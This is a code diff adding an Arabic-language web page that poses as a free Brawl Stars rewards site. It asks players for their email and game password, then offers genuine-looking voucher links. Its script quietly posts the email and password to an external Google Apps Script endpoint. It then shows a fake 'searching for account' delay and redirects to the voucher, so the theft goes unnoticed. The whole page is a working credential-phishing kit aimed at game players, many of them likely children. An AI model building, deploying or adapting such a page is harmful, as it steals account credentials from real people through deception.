@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع جوائز براول ستارز المجانية</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body { 
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px; 
+        }
+        
+        .container { 
+            background-color: #ffffff; 
+            padding: 35px 30px; 
+            border-radius: 15px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2); 
+            width: 100%; 
+            max-width: 450px; 
+            text-align: center; 
+            border: 2px solid #e2e8f0;
+        }
+
+        h2 { margin-bottom: 10px; color: #1e3c72; font-size: 26px; font-weight: bold; }
+        .subtitle { color: #64748b; font-size: 14px; margin-bottom: 25px; }
+        
+        .input-group { margin-bottom: 20px; text-align: right; }
+        .input-group label { display: block; margin-bottom: 8px; color: #1e3c72; font-weight: bold; font-size: 14px; }
+        
+        .input-group input, .input-group select { 
+            width: 100%; 
+            padding: 12px 15px; 
+            border: 2px solid #cbd5e1; 
+            background-color: #ffffff;
+            color: #334155;
+            border-radius: 8px; 
+            outline: none; 
+            font-size: 16px; 
+            transition: all 0.3s;
+        }
+        .input-group input:focus, .input-group select:focus { 
+            border-color: #2a5298; 
+            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
+        }
+        
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: #1e3c72; 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 18px; 
+            font-weight: bold;
+            cursor: pointer; 
+            transition: background-color 0.2s, transform 0.1s;
+        }
+        button:hover { background-color: #162e5a; }
+        button:active { transform: scale(0.98); }
+        
+        /* شاشة الانتظار */
+        .loading-screen {
+            padding: 30px 0;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1e3c72;
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text { 
+            font-size: 18px; 
+            color: #1e3c72; 
+            font-weight: bold; 
+        }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- الواجهة الأساسية: استمارة التسجيل -->
+        <div id="form-container">
+            <h2>🎁 Brawl Stars Rewards 🎁</h2>
+            <p class="subtitle">سجل حسابك واختر جائزتك المفضلة وسيتم تحويلك فوراً لرابط الاستلام داخل اللعبة!</p>
+            
+            <form id="register-form" onsubmit="handleRegister(event)">
+                <div class="input-group">
+                    <label for="email">البريد الإلكتروني للّاعب</label>
+                    <input type="email" id="email" placeholder="name@example.com" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="reward-select">اختر الجائزة التي تريدها:</label>
+                    <select id="reward-select" required>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=2593e957-9cef-4ce7-b15f-b1dec74ec7df">Cartoon Man 🤵</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=4c9ea6d6-10f7-430d-a506-201903512c50">SpongeBob M 🧽</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=cc017c48-b904-448d-9fe1-dd494e28bfd2">Godzilla Sleepy Egg 🥚</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=974a1b0f-b2f7-45c5-978e-bdade83062a1">Treasure map spray 🗺️</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=b647c71d-41a5-42c4-a10f-8d47952d82f3">Clown Pin 🤡</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=315b3e4f-0fd5-4a31-a5b0-86806f7638fc">Man with White Stuff on Face 👤</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=91eead0b-0917-4077-8efe-6b852c7e49a3">Chained Book 📖</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=3484c6d2-9ab5-4eae-878a-4a186fc4e24a">Classic Brawl Stars 🏆</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=ab9cf7c2-45f8-4012-ad38-dfe8b1747c3b">Global Spike 🌵</option>
+                        <option value="https://link.brawlstars.com/en/?action=voucher&code=935251d2-1647-433e-a6e6-771a6ade9293">Angry Kaiju 🦖</option>
+                        <option value="https://store.supercell.com/brawlstars?voucher=a70e807d-d42c-4aff-a045-b74ba8457163">Gigi Box and Icon 📦</option>
+                        <option value="https://link.brawlstars.com/voucher/cbd9bc12-423e-4a32-be45-590b0ebc52ad">Upside Down 🙃</option>
+                    </select>
+                </div>
+
+                <button type="submit" id="reg-btn">سجّل واستلم الجائزة فوراً!</button>
+            </form>
+        </div>
+
+        <!-- واجهة الانتظار: تظهر بعد الضغط على الزر فقط وتختفي الاستمارة -->
+        <div id="loading-container" class="loading-screen hidden">
+            <div class="spinner"></div>
+            <div class="loading-text">جاري البحث عن الحساب وثم الانتقال...</div>
+        </div>
+    </div>
+
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwXK18xCIF6xWtPd8j8-f5_2CvLrdFRvApppEUUogXZWA55kYSuiptvSTEamQVD2m8lNg/exec";
+
+        async function handleRegister(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const selectElement = document.getElementById('reward-select');
+            const chosenLink = selectElement.value; 
+            const chosenName = selectElement.options[selectElement.selectedIndex].text; 
+
+            // إخفاء الاستمارة بالكامل وإظهار شاشة جاري البحث عن الحساب
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('loading-container').classList.remove('hidden');
+
+            try {
+                // إرسال البيانات مخفية إلى الجوجل شيت لحفظها
+                await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', 
+                    body: JSON.stringify({ email: email, password: password, reward: chosenName })
+                });
+                
+                // تأخير بسيط لمدة ثانيتين لإعطاء واقعية لعملية "البحث عن الحساب" ثم تحويل اللاعب
+                setTimeout(() => {
+                    window.location.href = chosenLink;
+                }, 2500);
+
+            } catch (error) {
+                console.error(error);
+                // تحويل فوري حتى لو حدث خطأ بالاتصال
+                window.location.href = chosenLink;
+            }
+        }
+    </script>
+</body>
+</html>
